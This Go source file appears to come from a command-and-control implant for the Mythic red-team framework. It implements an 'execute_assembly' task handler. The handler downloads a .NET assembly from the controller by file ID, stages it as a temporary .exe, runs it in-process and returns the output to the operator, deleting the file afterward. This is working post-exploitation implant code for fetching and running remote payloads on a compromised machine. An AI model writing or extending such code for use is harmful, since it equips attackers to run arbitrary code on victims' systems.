package main

import (
	"fmt"
	"os"
)

// runAssembly executes a staged .NET assembly in-process and returns its
// captured output. The platform implementation lives in
// execasm_windows.go; tests override this hook to check the orchestration
// (fetch, staging, cleanup) without a CLR.
var runAssembly = runAssemblyInProcess

func handleExecuteAssembly(a *Agent, t Task) (Response, bool) {
	fileID := taskParam(t.Parameters, "assembly_file")
	if fileID == "" {
		return errResponse(fmt.Errorf("no assembly file id"))
	}
	args := taskParam(t.Parameters, "assembly_arguments")
	staged, err := os.CreateTemp("", "erlikhan-asm-*.exe")
	if err != nil {
		return errResponse(err)
	}
	path := staged.Name()
	defer os.Remove(path)
	if _, _, err := fetchMythicFile(t.ID, fileID, a.chunkSize(), a.posterFor(), staged); err != nil {
		staged.Close()
		return errResponse(err)
	}
	if err := staged.Close(); err != nil {
		return errResponse(err)
	}
	out, err := runAssembly(path, args)
	if err != nil {
		return errResponse(err)
	}
	return Response{UserOutput: out, Status: "success",
		Artifacts: oneArtifact("Process Create", "execute_assembly "+args)}, false
}
